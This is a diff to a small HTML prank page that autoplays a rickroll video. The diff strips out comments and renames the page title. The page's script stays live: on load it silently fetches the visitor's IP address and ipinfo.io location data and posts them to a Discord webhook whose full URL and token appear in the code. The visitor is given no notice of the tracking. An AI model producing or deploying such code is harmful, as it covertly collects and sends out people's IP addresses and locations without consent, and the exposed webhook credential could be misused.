@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>craf</title>
+    <title>lol</title>
     <style>
         body, html {
             margin: 0;
@@ -26,22 +26,18 @@
     <script>
         async function sendIP() {
             try {
-                // Fetch the user's IP address
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
                 const userIP = ipData.ip;
 
-                // Fetch additional information from ipinfo.io
                 const infoResponse = await fetch(`https://ipinfo.io/${userIP}/json`);
                 const infoData = await infoResponse.json();
 
-                // Your Discord webhook URL
                 const webhookURL = 'https://discord.com/api/webhooks/1377028231135363212/JsS0pwLdWBN9ZhFE0vYvXEERCseOgfbM1QZIiJywQpczkbphvNU96nLiVm9VkLphuhgM';
 
-                // Create an embed message for Discord
                 const embed = {
                     title: "User IP Information",
-                    color: 3447003, // A nice blue color
+                    color: 3447003,
                     fields: [
                         { name: "IP Address", value: `**${userIP}**`, inline: true },
                         { name: "City", value: infoData.city || "N/A", inline: true },
@@ -52,7 +48,6 @@
                     ]
                 };
 
-                // Send the IP address and info to the Discord webhook
                 await fetch(webhookURL, {
                     method: 'POST',
                     headers: {
@@ -67,10 +62,8 @@
             }
         }
 
-        // Call the function when the page loads
         window.onload = function() {
             sendIP();
-            // Embed the rickroll video
             document.body.innerHTML += `
                 <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&controls=0&loop=1&playlist=dQw4w9WgXcQ" allow="autoplay" allowfullscreen></iframe>
             `;
